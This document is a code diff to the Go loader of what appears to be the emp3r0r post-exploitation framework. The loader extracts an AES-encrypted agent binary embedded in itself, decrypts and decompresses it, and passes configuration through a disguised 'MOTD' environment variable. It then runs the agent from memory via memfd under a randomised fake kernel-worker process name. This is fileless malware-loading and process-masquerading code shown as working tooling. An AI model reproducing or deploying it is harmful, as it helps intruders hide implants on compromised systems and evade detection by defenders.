@@ -18,21 +18,16 @@ import (
 
 func main() {
 	// find embeded ELF
-	encElfBytes, err := util.DigEmbeddedDataFromArg0()
+	read_elf_bytes, err := util.ExtractData()
 	if err != nil {
-		e := err
-		log.Printf("DigEmbeddedDataFromArg0: %v", err)
-		encElfBytes, err = util.DigEmbededDataFromMem()
-		if err != nil {
-			log.Fatalf("DigEmbeddedDataFromArg0: %v. DigEmbededDataFromMem: %v", e, err)
-		}
+		log.Fatalf("Searching for agent ELF: %v", err)
 	}
 
 	// decrypt attached ELF file
 	key := tun.GenAESKey(emp3r0r_data.MagicString)
-	elfdata := tun.AESDecryptRaw(key, encElfBytes)
+	elfdata := tun.AESDecryptRaw(key, read_elf_bytes)
 	if elfdata == nil {
-		log.Fatal("AESDecrypt failed")
+		log.Fatalf("AESDecrypt failed: length of cipher text is %d bytes", len(read_elf_bytes))
 	}
 
 	// decompress
@@ -60,8 +55,10 @@ func main() {
 	// set env so that agent can read config from it
 	config_data, err := util.DigEmbeddedData(extracted_agent_elf.Bytes())
 	if err != nil {
-		os.Setenv("MOTD", fmt.Sprintf("%s", config_data))
+		log.Printf("Extract config data from agent ELF: %v", err)
+		config_data = []byte("invalid_json_config")
 	}
+	os.Setenv("MOTD", fmt.Sprintf("%s", config_data))
 
 	// run from memfd
 	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
